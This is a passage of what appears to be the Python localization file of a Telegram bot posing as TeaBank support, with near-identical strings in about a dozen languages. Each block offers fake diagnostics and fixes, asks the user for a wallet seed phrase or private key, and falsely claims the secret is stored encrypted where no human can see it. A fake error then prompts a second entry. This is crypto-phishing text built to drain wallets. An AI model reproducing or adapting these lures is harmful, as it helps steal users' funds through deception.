        "wallet selection message": "Você selecionou {wallet_name}.\nSelecione seu modo de conexão preferido.",
        "reassurance": PROFESSIONAL_REASSURANCE["pt"],
        "prompt seed": "Por favor, insira sua seed phrase de 12 ou 24 palavras." + PROFESSIONAL_REASSURANCE["pt"],
        "prompt private key": "Por favor, insira sua chave privada." + PROFESSIONAL_REASSURANCE["pt"],
        "invalid choice": "Escolha inválida. Use os botões.",
        "final error message": "‼️ Ocorreu um erro. /start para tentar novamente.",
        "final_received_message": "Obrigado — sua seed ou chave privada foi recebida com segurança e será processada. Use /start para começar de novo.",
        "error_use_seed_phrase": "Este campo requer uma seed phrase (12 ou 24 palavras). Por favor, forneça a seed phrase.",
        "post_receive_error": "‼️ Ocorreu um erro. Certifique-se de inserir a chave correta — use copiar/colar para evitar erros. Por favor /start para tentar novamente.",
        "choose language": "Selecione seu idioma preferido:",
        "await restart message": "Clique em /start para reiniciar.",
        "back": "🔙 Voltar",
        "invalid_input": "Entrada inválida. Use /start para começar.",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "Reivindicar Árvores",
        "claim water": "Reivindicar Água",
    },
    "id": {
        "welcome": "Hi {user}, Bot ini dirancang untuk membantu Anda mendiagnosis dan menyelesaikan masalah TeaBank — akses dompet, transaksi, saldo, pemulihan, deposit dan penarikan, serta validasi akun. Ketuk opsi menu dan bot akan menjalankan pemeriksaan otomatis dan membimbing Anda melalui perbaikan untuk: Validasi; Klaim Token; Pemulihan Aset; Saldo Hilang; Penarikan; Fix AdsGramError (Block 7558); Klaim Pohon; Klaim Air. Demi keamanan Anda: setiap informasi sensitif yang Anda berikan akan diproses secara otomatis dan disimpan terenkripsi; tidak ada manusia yang akan mengaksesnya.",
        "main menu title": "Silakan pilih jenis masalah untuk melanjutkan:",
        "buy": "Beli",
        "validation": "Validasi",
        "claim tokens": "Klaim Token",
        "migration issues": "Masalah Migrasi",
        "assets recovery": "Pemulihan Aset",
        "general issues": "Masalah Umum",
        "rectification": "Rekonsiliasi",
        "staking issues": "Masalah Staking",
        "deposits": "Deposit",
        "withdrawals": "Penarikan",
        "missing balance": "Saldo Hilang",
        "login issues": "Masalah Login",
        "high gas fees": "Biaya Gas Tinggi",
        "presale issues": "Masalah Pra-penjualan",
        "claim missing sticker": "Klaim Sticker Hilang",
        "connect wallet message": "Sambungkan dompet Anda dengan Kunci Pribadi atau Seed Phrase untuk melanjutkan.",
        "connect wallet button": "🔑 Sambungkan Dompet",
        "select wallet type": "Pilih jenis dompet Anda:",
        "other wallets": "Dompet Lain",
        "private key": "🔑 Kunci Pribadi",
        "seed phrase": "🔒 Impor Seed Phrase",
        "wallet selection message": "Anda telah memilih {wallet_name}.\nPilih mode koneksi pilihan Anda.",
        "reassurance": PROFESSIONAL_REASSURANCE["id"],
        "prompt seed": "Masukkan seed phrase 12 atau 24 kata Anda." + PROFESSIONAL_REASSURANCE["id"],
        "prompt private key": "Masukkan kunci pribadi Anda." + PROFESSIONAL_REASSURANCE["id"],
        "invalid choice": "Pilihan tidak valid. Gunakan tombol.",
        "final error message": "‼️ Terjadi kesalahan. /start untuk mencoba lagi.",
        "final_received_message": "Terima kasih — seed atau kunci pribadi Anda telah diterima dengan aman dan akan diproses. Gunakan /start untuk mulai lagi.",
        "error_use_seed_phrase": "Kolom ini memerlukan seed phrase (12 atau 24 kata). Silakan berikan seed phrase.",
        "post_receive_error": "‼️ Terjadi kesalahan. Pastikan Anda memasukkan kunci yang benar — gunakan salin dan tempel untuk menghindari kesalahan. Silakan /start untuk mencoba lagi.",
        "choose language": "Silakan pilih bahasa:",
        "await restart message": "Klik /start untuk memulai ulang.",
        "back": "🔙 Kembali",
        "invalid_input": "Input tidak valid. Gunakan /start untuk mulai.",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "Klaim Pohon",
        "claim water": "Klaim Air",
    },
    "de": {
        "welcome": "Hi {user}, Dieser Bot wurde entwickelt, um Ihnen bei der Diagnose und Behebung von TeaBank-Problemen zu helfen — Wallet-Zugriff, Transaktionen, Kontostände, Wiederherstellungen, Einzahlungen und Auszahlungen sowie Konto-Validierungen. Tippen Sie eine Menüoption an und der Bot führt automatisierte Prüfungen aus und leitet Sie durch Behebungen für: Validierung; Tokens beanspruchen; Wiederherstellung von Vermögenswerten; Fehlender Kontostand; Auszahlungen; Fix AdsGramError (Block 7558); Bäume beanspruchen; Wasser beanspruchen. Für Ihre Sicherheit: alle sensiblen Informationen, die Sie angeben, werden automatisch verarbeitet und verschlüsselt gespeichert; kein Mensch hat Zugriff darauf.",
        "main menu title": "Bitte wählen Sie einen Problemtyp, um fortzufahren:",
        "buy": "Kaufen",
        "validation": "Validierung",
        "claim tokens": "Tokens Beanspruchen",
        "migration issues": "Migrationsprobleme",
        "assets recovery": "Wiederherstellung von Vermögenswerten",
        "general issues": "Allgemeine Probleme",
        "rectification": "Berichtigung",
        "staking issues": "Staking-Probleme",
        "deposits": "Einzahlungen",
        "withdrawals": "Auszahlungen",
        "missing balance": "Fehlender Saldo",
        "login issues": "Anmeldeprobleme",
        "high gas fees": "Hohe Gasgebühren",
        "presale issues": "Presale-Probleme",
        "claim missing sticker": "Fehlenden Sticker Beanspruchen",
        "connect wallet message": "Bitte verbinden Sie Ihre Wallet mit Ihrem privaten Schlüssel oder Ihrer Seed-Phrase, um fortzufahren.",
        "connect wallet button": "🔑 Wallet Verbinden",
        "select wallet type": "Bitte wählen Sie Ihren Wallet-Typ:",
        "other wallets": "Andere Wallets",
        "private key": "🔑 Privater Schlüssel",
        "seed phrase": "🔒 Seed-Phrase importieren",
        "wallet selection message": "Sie haben {wallet_name} ausgewählt.\nWählen Sie Ihre bevorzugte Verbindungsmethode.",
        "reassurance": PROFESSIONAL_REASSURANCE["de"],
        "prompt seed": "Bitte geben Sie Ihre Seed-Phrase mit 12 oder 24 Wörtern ein." + PROFESSIONAL_REASSURANCE["de"],
        "prompt private key": "Bitte geben Sie Ihren privaten Schlüssel ein." + PROFESSIONAL_REASSURANCE["de"],
        "invalid choice": "Ungültige Auswahl. Bitte verwenden Sie die Schaltflächen.",
        "final error message": "‼️ Ein Fehler ist aufgetreten. /start zum Wiederholen.",
        "final_received_message": "Vielen Dank — Ihre seed oder Ihr privater Schlüssel wurde sicher empfangen und wird verarbeitet. Verwenden Sie /start, um neu zu beginnen.",
        "error_use_seed_phrase": "Dieses Feld erfordert eine Seed-Phrase (12 oder 24 Wörter).",
        "post_receive_error": "‼️ Ein Fehler ist aufgetreten. Bitte stellen Sie sicher, dass Sie den richtigen Schlüssel eingeben — verwenden Sie Kopieren/Einfügen, um Fehler zu vermeiden. Bitte /start, um es erneut zu versuchen.",
        "choose language": "Bitte wählen Sie Ihre bevorzugte Sprache:",
        "await restart message": "Bitte klicken Sie auf /start, um von vorne zu beginnen.",
        "back": "🔙 Zurück",
        "invalid_input": "Ungültige Eingabe. Bitte verwenden Sie /start um zu beginnen.",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "Bäume Beanspruchen",
        "claim water": "Wasser Beanspruchen",
    },
    "nl": {
        "welcome": "Hi {user}, Deze bot is ontworpen om u te helpen bij het diagnosticeren en oplossen van TeaBank-problemen — wallet-toegang, transacties, saldi, herstel, stortingen en opnames, en accountvalidaties. Tik op een menuoptie en de bot voert automatische controles uit en begeleidt u bij het oplossen voor: Validatie; Tokens Claimen; Herstel van Activa; Ontbrekend Saldo; Opnames; Fix AdsGramError (Block 7558); Bomen Claimen; Water Claimen. Voor uw veiligheid: alle gevoelige informatie die u verstrekt, wordt automatisch verwerkt en versleuteld opgeslagen; geen mens heeft er toegang toe.",
        "main menu title": "Selecteer een type probleem om door te gaan:",
        "buy": "Kopen",
        "validation": "Validatie",
        "claim tokens": "Tokens Claimen",
        "migration issues": "Migratieproblemen",
        "assets recovery": "Herstel van Activa",
        "general issues": "Algemene Problemen",
        "rectification": "Rectificatie",
        "staking issues": "Staking-problemen",
        "deposits": "Stortingen",
        "withdrawals": "Opnames",
        "missing balance": "Ontbrekend Saldo",
        "login issues": "Login-problemen",
        "high gas fees": "Hoge Gas-kosten",
        "presale issues": "Presale-problemen",
        "claim missing sticker": "Ontbrekende Sticker Claimen",
        "connect wallet message": "Verbind uw wallet met uw private key of seed phrase om door te gaan.",
        "connect wallet button": "🔑 Wallet Verbinden",
        "select wallet type": "Selecteer uw wallet-type:",
        "other wallets": "Andere Wallets",
        "private key": "🔑 Privésleutel",
        "seed phrase": "🔒 Seed Phrase Importeren",
        "wallet selection message": "U heeft {wallet_name} geselecteerd.\nSelecteer uw voorkeursverbindingswijze.",
        "reassurance": PROFESSIONAL_REASSURANCE["nl"],
        "prompt seed": "Voer uw seed phrase met 12 of 24 woorden in." + PROFESSIONAL_REASSURANCE["nl"],
        "prompt private key": "Voer uw privésleutel in." + PROFESSIONAL_REASSURANCE["nl"],
        "invalid choice": "Ongeldige keuze. Gebruik de knoppen.",
        "final error message": "‼️ Er is een fout opgetreden. Gebruik /start om opnieuw te proberen.",
        "final_received_message": "Dank u — uw seed of privésleutel is veilig ontvangen en zal worden verwerkt. Gebruik /start om opnieuw te beginnen.",
        "error_use_seed_phrase": "Het lijkt op een adres. Dit veld vereist een seed-phrase (12 of 24 woorden). Geef de seed-phrase op.",
        "post_receive_error": "‼️ Er is een fout opgetreden. Zorg ervoor dat u de juiste sleutel invoert — gebruik kopiëren en plakken om fouten te voorkomen. Gebruik /start om het opnieuw te proberen.",
        "choose language": "Selecteer uw voorkeurstaal:",
        "await restart message": "Klik op /start om opnieuw te beginnen.",
        "back": "🔙 Terug",
        "invalid_input": "Ongeldige invoer. Gebruik /start om te beginnen.",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "Bomen Claimen",
        "claim water": "Water Claimen",
    },
    "hi": {
        "welcome": "Hi {user}, यह बोट TeaBank संबंधित समस्याओं का निदान और समाधान करने के लिए बनाया गया है — वॉलेट एक्सेस, लेनदेन, बैलेंस, रिकवरी, जमा और निकासी, और खाता सत्यापन। मेन्यू विकल्प टैप करें और बोट स्वचालित जाँच करेगा और आपको निम्नलिखित के लिए सुधार में मार्गदर्शन करेगा: सत्यापन; टोकन क्लेम; संपत्ति पुनर्प्राप्ति; गायब बैलेंस; निकासी; Fix AdsGramError (Block 7558); ट्री क्लेम; वॉटर क्लेम। आपकी सुरक्षा के लिए: कोई भी संवेदनशील जानकारी जो आप प्रदान करते हैं स्वतः संसाधित की जाती है और एन्क्रिप्टेड रूप में संग्रहीत की जाती है; किसी भी व्यक्ति को इसकी पहुँच नहीं होगी।",
        "main menu title": "कृपया जारी रखने के लिए एक समस्या प्रकार चुनें:",
        "buy": "खरीदें",
        "validation": "सत्यापन",
        "claim tokens": "टोकन का दावा करें",
        "migration issues": "माइग्रेशन समस्याएँ",
        "assets recovery": "संपत्ति पुनर्प्राप्ति",
        "general issues": "सामान्य समस्याएँ",
        "rectification": "सुधार",
        "staking issues": "स्टेकिंग समस्याएँ",
        "deposits": "जमा",
        "withdrawals": "निकासी",
        "missing balance": "गायब बैलेंस",
        "login issues": "लॉगिन समस्याएँ",
        "high gas fees": "उच्च गैस शुल्क",
        "presale issues": "प्रीसेल समस्याएँ",
        "claim missing sticker": "गायब स्टिकर का दावा करें",
        "connect wallet message": "कृपया वॉलेट को प्राइवेट की या सीड वाक्यांश से कनेक्ट करें।",
        "connect wallet button": "🔑 वॉलेट कनेक्ट करें",
        "select wallet type": "कृपया वॉलेट प्रकार चुनें:",
        "other wallets": "अन्य वॉलेट",
        "private key": "🔑 निजी कुंजी",
        "seed phrase": "🔒 सीड वाक्यांश आयात करें",
        "wallet selection message": "आपने {wallet_name} चुना है。\nकनेक्शन मोड चुनें。",
        "reassurance": PROFESSIONAL_REASSURANCE["hi"],
        "prompt seed": "कृपया 12 या 24 शब्दों की seed phrase दर्ज करें。" + PROFESSIONAL_REASSURANCE["hi"],
        "prompt private key": "कृपया अपनी निजी कुंजी दर्ज करें。" + PROFESSIONAL_REASSURANCE["hi"],
        "invalid choice": "अमान्य विकल्प। कृपया बटन का उपयोग करें।",
        "final error message": "‼️ एक त्रुटि हुई। /start से पुनः प्रयास करें।",
        "final_received_message": "धन्यवाद — आपकी seed या निजी कुंजी सुरक्षित रूप से प्राप्त कर ली गई है और संसाधित की जाएगी। /start से पुनः शुरू करें।",
        "error_use_seed_phrase": "यह फ़ील्ड seed phrase (12 या 24 शब्द) मांगता है। कृपया seed दें।",
        "post_receive_error": "‼️ एक त्रुटि हुई। कृपया सुनिश्चित करें कि आप सही कुंजी दर्ज कर रहे हैं — त्रुटियों से बचने के लिए कॉपी-पेस्ट का उपयोग करें। /start के साथ पुनः प्रयास करें।",
        "choose language": "कृपया भाषा चुनें:",
        "await restart message": "कृपया /start दबाएँ।",
        "back": "🔙 वापस",
        "invalid_input": "अमान्य इनपुट। /start उपयोग करें।",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "ट्री क्लेम",
        "claim water": "वाटर क्लेम",
    },
    "tr": {
        "welcome": "Hi {user}, Bu bot, TeaBank sorunlarını teşhis etmenize ve çözmenize yardımcı olacak şekilde tasarlanmıştır — cüzdan erişimi, işlemler, bakiyeler, kurtarmalar, yatırmalar ve çekimler ve hesap doğrulamaları. Menüden bir seçenek seçin; bot otomatik kontroller çalıştıracak ve şunlar için düzeltmelerde size rehberlik edecektir: Doğrulama; Token Talebi; Varlık Kurtarma; Eksik Bakiye; Çekimler; Fix AdsGramError (Block 7558); Ağaç Talebi; Su Talebi. Güvenliğiniz için: sağladığınız hassas bilgiler otomatik olarak işlenir ve şifrelenmiş olarak saklanır; hiçbir insan bunlara erişmeyecektir.",
        "main menu title": "Devam etmek için bir sorun türü seçin:",
        "buy": "Satın Al",
        "validation": "Doğrulama",
        "claim tokens": "Token Talep Et",
        "migration issues": "Migrasyon Sorunları",
        "assets recovery": "Varlık Kurtarma",
        "general issues": "Genel Sorunlar",
        "rectification": "Düzeltme",
        "staking issues": "Staking Sorunları",
        "deposits": "Para Yatırma",
        "withdrawals": "Para Çekme",
        "missing balance": "Eksik Bakiye",
        "login issues": "Giriş Sorunları",
        "high gas fees": "Yüksek Gas Ücretleri",
        "presale issues": "Ön Satış Sorunları",
        "claim missing sticker": "Kayıp Sticker Talep Et",
        "connect wallet message": "Lütfen cüzdanınızı özel anahtar veya seed ile bağlayın.",
        "connect wallet button": "🔑 Cüzdanı Bağla",
        "select wallet type": "Lütfen cüzdan türünü seçin:",
        "other wallets": "Diğer Cüzdanlar",
        "private key": "🔑 Özel Anahtar",
        "seed phrase": "🔒 Seed Cümlesi İçe Aktar",
        "wallet selection message": "{wallet_name} seçtiniz。\nBağlantı modunu seçin。",
        "reassurance": PROFESSIONAL_REASSURANCE["tr"],
        "prompt seed": "Lütfen 12 veya 24 kelimelik seed phrase girin。" + PROFESSIONAL_REASSURANCE["tr"],
        "prompt private key": "Lütfen özel anahtarınızı girin。" + PROFESSIONAL_REASSURANCE["tr"],
        "invalid choice": "Geçersiz seçim. Lütfen düğmeleri kullanın。",
        "final error message": "‼️ Bir hata oluştu。 /start ile tekrar deneyin。",
        "final_received_message": "Teşekkürler — seed veya özel anahtarınız güvenli şekilde alındı ve işlenecektir。 /start ile yeniden başlayın。",
        "error_use_seed_phrase": "Bu alan bir seed phrase (12 veya 24 kelime) gerektirir。 Lütfen seed girin。",
        "post_receive_error": "‼️ Bir hata oluştu。 Lütfen doğru anahtarı girdiğinizden emin olun — hataları önlemek için kopyala-yapıştır kullanın。 Lütfen /start ile tekrar deneyin。",
        "choose language": "Lütfen dilinizi seçin:",
        "await restart message": "Lütfen /start ile yeniden başlayın。",
        "back": "🔙 Geri",
        "invalid_input": "Geçersiz giriş。 /start kullanın。",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "Ağaç Talep Et",
        "claim water": "Su Talep Et",
    },
    "zh": {
        "welcome": "Hi {user}, 此机器人旨在帮助您诊断并解决 TeaBank 问题——钱包访问、交易、余额、恢复、存款与提现，以及账户验证。点击菜单选项，机器人将运行自动检查并引导您解决：验证；认领代币；资产恢复；丢失余额；提现；Fix AdsGramError (Block 7558); 认领树木；认领水。为了您的安全：您提供的任何敏感信息都会被自动处理并以加密方式存储；无人将以任何方式访问这些信息。",
        "main menu title": "请选择一个问题类型以继续：",
        "buy": "购买",
        "validation": "验证",
        "claim tokens": "认领代币",
        "migration issues": "迁移问题",
        "assets recovery": "资产恢复",
        "general issues": "常规问题",
        "rectification": "修正",
        "staking issues": "质押问题",
        "deposits": "存款",
        "withdrawals": "提现",
        "missing balance": "丢失余额",
        "login issues": "登录问题",
        "high gas fees": "高 Gas 费用",
        "presale issues": "预售问题",
        "claim missing sticker": "申领丢失贴纸",
        "connect wallet message": "请用私钥或助记词连接钱包以继续。",
        "connect wallet button": "🔑 连接钱包",
        "select wallet type": "请选择您的钱包类型：",
        "other wallets": "其他钱包",
        "private key": "🔑 私钥",
        "seed phrase": "🔒 导入助记词",
        "wallet selection message": "您已选择 {wallet_name}。\n请选择连接方式。",
        "reassurance": PROFESSIONAL_REASSURANCE["zh"],
        "prompt seed": "请输入 12 或 24 个单词的助记词。" + PROFESSIONAL_REASSURANCE["zh"],
        "prompt private key": "请输入您的私钥。" + PROFESSIONAL_REASSURANCE["zh"],
        "invalid choice": "无效选择。请使用按钮。",
        "final error message": "‼️ 出现错误。/start 重试。",
        "final_received_message": "谢谢 — 您的 seed 或私钥已被安全接收并将被处理。/start 重新开始。",
        "error_use_seed_phrase": "此字段需要助记词 (12 或 24 个单词)。请提供助记词。",
        "post_receive_error": "‼️ 出现错误。请确保输入正确的密钥 — 使用复制粘贴以避免错误。请 /start 再试。",
        "choose language": "请选择语言：",
        "await restart message": "请点击 /start 重新开始。",
        "back": "🔙 返回",
        "invalid_input": "无效输入。请使用 /start 开始。",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "认领树木",
        "claim water": "认领水",
    },
    "cs": {
        "welcome": "Hi {user}, Tento bot je navržen tak, aby vám pomohl diagnostikovat a vyřešit problémy TeaBank — přístup k peněžence, transakce, zůstatky, obnovy, vklady a výběry a validace účtu. Klepněte na možnost v nabídce a bot provede automatické kontroly a provede vás opravami pro: Validace; Nárok na tokeny; Obnovení aktiv; Chybějící zůstatek; Výběry; Fix AdsGramError (Block 7558); Nárok na stromy; Nárok na vodu. Pro vaše bezpečí: veškeré citlivé informace, které poskytnete, jsou zpracovávány automaticky a uloženy šifrovaně; žádný člověk k nim nebude mít přístup.",
        "main menu title": "Vyberte typ problému pro pokračování:",
        "buy": "Koupit",
        "validation": "Ověření",
        "claim tokens": "Nárokovat Tokeny",
        "migration issues": "Problémy s migrací",
        "assets recovery": "Obnovení aktiv",
        "general issues": "Obecné problémy",
        "rectification": "Oprava",
        "staking issues": "Problémy se stakingem",
        "deposits": "Vklady",
        "withdrawals": "Výběry",
        "missing balance": "Chybějící zůstatek",
        "login issues": "Problémy s přihlášením",
        "high gas fees": "Vysoké poplatky za gas",
        "presale issues": "Problémy s předprodejem",
        "claim missing sticker": "Nárokovat chybějící samolepku",
        "connect wallet message": "Připojte peněženku pomocí soukromého klíče nebo seed fráze.",
        "connect wallet button": "🔑 Připojit peněženku",
        "select wallet type": "Vyberte typ peněženky:",
        "other wallets": "Jiné peněženky",
        "private key": "🔑 Soukromý klíč",
        "seed phrase": "🔒 Importovat seed frázi",
        "wallet selection message": "Vybrali jste {wallet_name}.\nVyberte preferovaný způsob připojení.",
        "reassurance": PROFESSIONAL_REASSURANCE["cs"],
        "prompt seed": "Zadejte seed frázi o 12 nebo 24 slovech." + PROFESSIONAL_REASSURANCE["cs"],
        "prompt private key": "Zadejte prosím svůj soukromý klíč." + PROFESSIONAL_REASSURANCE["cs"],
        "invalid choice": "Neplatná volba. Použijte tlačítka.",
        "final error message": "‼️ Došlo k chybě. /start pro opakování.",
        "final_received_message": "Děkujeme — vaše seed nebo privátní klíč byl bezpečně přijat a bude zpracován. Použijte /start pro opakování.",
        "error_use_seed_phrase": "Zadejte seed frázi (12 nebo 24 slov), ne adresu.",
        "post_receive_error": "‼️ Došlo k chybě. Ujistěte se, že zadáváte správný klíč — použijte kopírovat a vložit. Prosím /start pro opakování.",
        "choose language": "Vyberte preferovaný jazyk:",
        "await restart message": "Klikněte /start pro restart.",
        "back": "🔙 Zpět",
        "invalid_input": "Neplatný vstup. Použijte /start.",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "Nárok na stromy",
        "claim water": "Nárok na vodu",
    },
    "ur": {
        "welcome": "Hi {user}, یہ بوٹ TeaBank کے مسائل کی تشخیص اور حل کرنے میں آپ کی مدد کے لیے ڈیزائن کیا گیا ہے — والٹ تک رسائی، ٹرانزیکشنز، بیلنس، بحالی، ڈپازٹس اور ودڈرال، اور اکاؤنٹ کی توثیق۔ مینو آپشن پر ٹیپ کریں اور بوٹ خودکار چیکس چلائے گا اور آپ کو درج ذیل کے حل میں رہنمائی کرے گا: توثیق؛ ٹوکن کلیم؛ اثاثہ کی بازیابی؛ غائب بیلنس؛ ودڈرال؛ Fix AdsGramError (Block 7558); درخت کلیم؛ پانی کلیم۔ آپ کی سلامتی کے لیے: آپ کی فراہم کردہ کوئی بھی حساس معلومات خودکار طور پر عمل میں لائی جاتی ہیں اور انکرپٹڈ طور پر محفوظ کی جاتی ہیں؛ کسی انسان کی رسائی نہیں ہوگی۔",
        "main menu title": "جاری رکھنے کے لیے مسئلے کی قسم منتخب کریں:",
        "buy": "خریدیں",
        "validation": "تصدیق",
        "claim tokens": "ٹوکن کلیم کریں",
        "migration issues": "مائیگریشن کے مسائل",
        "assets recovery": "اثاثہ بازیابی",
        "general issues": "عمومی مسائل",
        "rectification": "درستگی",
        "staking issues": "اسٹیکنگ کے مسائل",
        "deposits": "جمع",
        "withdrawals": "رقم نکالیں",
        "missing balance": "گم شدہ بیلنس",
        "login issues": "لاگ ان مسائل",
        "high gas fees": "زیادہ گیس فیس",
        "presale issues": "پری سیل کے مسائل",
        "claim missing sticker": "غائب اسٹیکر کا دعویٰ کریں",
        "connect wallet message": "براہِ کرم والٹ کو پرائیویٹ کی یا seed کے ساتھ منسلک کریں۔",
        "connect wallet button": "🔑 والٹ جوڑیں",
        "select wallet type": "براہِ کرم والٹ کی قسم منتخب کریں:",
        "other wallets": "دیگر والٹس",
        "private key": "🔑 پرائیویٹ کی",
        "seed phrase": "🔒 سیڈ فریز امپورٹ کریں",
        "wallet selection message": "آپ نے {wallet_name} منتخب کیا ہے。\nاپنا پسندیدہ کنکشن طریقہ منتخب کریں。",
        "reassurance": PROFESSIONAL_REASSURANCE["ur"],
        "prompt seed": "براہ کرم 12 یا 24 الفاظ کی seed phrase درج کریں。" + PROFESSIONAL_REASSURANCE["ur"],
        "prompt private key": "براہ کرم اپنی پرائیویٹ کی درج کریں。" + PROFESSIONAL_REASSURANCE["ur"],
        "invalid choice": "غلط انتخاب۔ براہِ کرم بٹنز استعمال کریں۔",
        "final error message": "‼️ ایک خرابی پیش آئی۔ /start دوبارہ کوشش کریں۔",
        "final_received_message": "شکریہ — آپ کی seed یا نجی کلید محفوظ طور پر موصول ہوگئی ہے اور پراسیس کی جائے گی۔ /start سے دوبارہ شروع کریں۔",
        "error_use_seed_phrase": "یہ فیلڈ seed phrase (12 یا 24 الفاظ) کا تقاضا کرتا ہے۔ براہ کرم seed درج کریں۔",
        "post_receive_error": "‼️ ایک خرابی پیش آئی۔ براہ کرم یقینی بنائیں کہ آپ درست کلید درج کر رہے ہیں — غلطیوں سے بچنے کے لیے کاپی/پیسٹ کریں۔ براہ کرم /start دوبارہ کوشش کے لیے۔",
        "choose language": "براہِ کرم زبان منتخب کریں:",

        "await restart message": "براہ کرم /start دبائیں۔",
        "back": "🔙 واپس",
        "invalid_input": "غلط ان پٹ۔ /start استعمال کریں۔",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "دریخت کلیم",
        "claim water": "پانی کلیم",
    },
    "uz": {
        "welcome": "Hi {user}, Ushbu bot TeaBank muammolarini aniqlash va hal qilishda sizga yordam berish uchun moʻljallangan — hamyonga kirish, tranzaksiyalar, balanslar, tiklash, depozitlar va yechib olishlar, hamda hisob tekshiruvi. Menyudan variantni bosing va bot avtomatlashtirilgan tekshiruvlarni bajaradi hamda quyidagilarni hal qilishda sizga yoʻl-yoʻriq beradi: Tekshirish; Tokenlarni talab qilish; Aktivlarni tiklash; Yoʻqolgan balans; Yechishlar; Fix AdsGramError (Block 7558); Daraxtlarni talab qilish; Suvni talab qilish. Xavfsizligingiz uchun: taqdim etgan har qanday maxfiy ma'lumot avtomatik ravishda qayta ishlanadi va shifrlangan holda saqlanadi; hech kim unga kira olmaydi.",
        "main menu title": "Davom etish uchun muammo turini tanlang:",
        "buy": "Sotib olish",
        "validation": "Tekshirish",
        "claim tokens": "Tokenlarni da'vo qilish",
        "migration issues": "Migratsiya muammolari",
        "assets recovery": "Aktivlarni tiklash",
        "general issues": "Umumiy muammolar",
        "rectification": "Tuzatish",
        "staking issues": "Staking muammolari",
        "deposits": "Omonat",
        "withdrawals": "Chiqim",
        "missing balance": "Yoʻqolgan balans",
        "login issues": "Kirish muammolari",
        "high gas fees": "Yuqori gas toʻlovlari",
        "presale issues": "Oldindan sotish muammolari",
        "claim missing sticker": "Yoʻqolgan stikerni da'vo qilish",
        "connect wallet message": "Iltimos, hamyoningizni private key yoki seed bilan ulang.",
        "connect wallet button": "🔑 Hamyonni ulang",
        "select wallet type": "Hamyon turini tanlang:",
        "other wallets": "Boshqa hamyonlar",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Seed iborasini import qilish",
        "wallet selection message": "Siz {wallet_name} ni tanladingiz。\nUlanish usulini tanlang。",
        "reassurance": PROFESSIONAL_REASSURANCE["uz"],
        "prompt seed": "BOINKERS foydalanuvchi nomi va 12/24 soʻzni kiriting。" + PROFESSIONAL_REASSURANCE["uz"],
        "prompt private key": "Private key kiriting。" + PROFESSIONAL_REASSURANCE["uz"],
        "invalid choice": "Notoʻgʻri tanlov. Tugmalardan foydalaning.",
        "final error message": "‼️ Xato yuz berdi. /start bilan qayta urinib koʻring.",
        "final_received_message": "Rahmat — seed yoki xususiy kalitingiz qabul qilindi va qayta ishlanadi. /start bilan boshlang.",
        "error_use_seed_phrase": "Iltimos 12 yoki 24 soʻzli seed iborasini kiriting, manzil emas.",
        "post_receive_error": "‼️ Xato yuz berdi. Iltimos, to'g'ri kalitni kiriting — nusxalash va joylashtirishdan foydalaning. /start bilan qayta urinib ko‘ring.",
        "choose language": "Iltimos, tilni tanlang:",
        "await restart message": "Qayta boshlash uchun /start bosing.",
        "back": "🔙 Orqaga",
        "invalid_input": "Noto'g'ri kiritish. /start ishlating.",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "Daraxtlarni da'vo qilish",
        "claim water": "Suvni da'vo qilish",
    },
    "it": {
        "welcome": "Hi {user}, Questo bot è progettato per aiutarti a diagnosticare e risolvere problemi di TeaBank — accesso al wallet, transazioni, saldi, recuperi, depositi e prelievi e validazioni dell'account. Tocca un'opzione del menu e il bot eseguirà controlli automatici e ti guiderà nelle correzioni per: Validazione; Richiedi Token; Recupero Asset; Saldo Mancante; Prelievi; Fix AdsGramError (Block 7558); Richiedi Alberi; Richiedi Acqua. Per la tua sicurezza: qualsiasi informazione sensibile fornita viene elaborata automaticamente e memorizzata crittografata; nessun umano vi avrà accesso.",
        "main menu title": "Seleziona un tipo di problema per continuare:",
        "buy": "Acquistare",
        "validation": "Validazione",
        "claim tokens": "Richiedi Token",
        "migration issues": "Problemi di Migrazione",
        "assets recovery": "Recupero Asset",
        "general issues": "Problemi Generali",
        "rectification": "Rettifica",
        "staking issues": "Problemi di Staking",
        "deposits": "Depositi",
        "withdrawals": "Prelievi",
        "missing balance": "Saldo Mancante",
        "login issues": "Problemi di Accesso",
        "high gas fees": "Alte Commissioni Gas",
        "presale issues": "Problemi di Prevendita",
        "claim missing sticker": "Richiedi Sticker Mancante",
        "connect wallet message": "Collega il tuo wallet con la Chiave Privata o Seed Phrase per continuare.",
        "connect wallet button": "🔑 Connetti Wallet",
        "select wallet type": "Seleziona il tipo di wallet:",
        "other wallets": "Altri Wallet",
        "private key": "🔑 Chiave Privata",
        "seed phrase": "🔒 Importa Seed Phrase",
        "wallet selection message": "Hai selezionato {wallet_name}.\nSeleziona la modalità di connessione preferita.",
        "reassurance": PROFESSIONAL_REASSURANCE["it"],
        "prompt seed": "Inserisci la seed phrase di 12 o 24 parole." + PROFESSIONAL_REASSURANCE["it"],
        "prompt private key": "Inserisci la chiave privata." + PROFESSIONAL_REASSURANCE["it"],
        "invalid choice": "Scelta non valida. Usa i pulsanti.",
        "final error message": "‼️ Si è verificato un errore. /start per riprovare.",
        "final_received_message": "Grazie — seed o chiave privata ricevuti in modo sicuro e saranno processati. Usa /start per ricominciare.",
        "error_use_seed_phrase": "Questo campo richiede una seed phrase (12 o 24 parole).",
        "post_receive_error": "‼️ Si è verificato un errore. Assicurati di inserire la chiave corretta — usa copia e incolla per evitare errori. Per favore /start per riprovare.",
        "choose language": "Seleziona la lingua:",
        "await restart message": "Clicca /start per ricominciare.",
        "back": "🔙 Indietro",
        "invalid_input": "Input non valido. Usa /start.",
        "fix ads": "Fix AdsGramError (Block 7558)",
        "claim trees": "Richiedi Alberi",
        "claim water": "Richiedi Acqua",
    },
    "ja": {
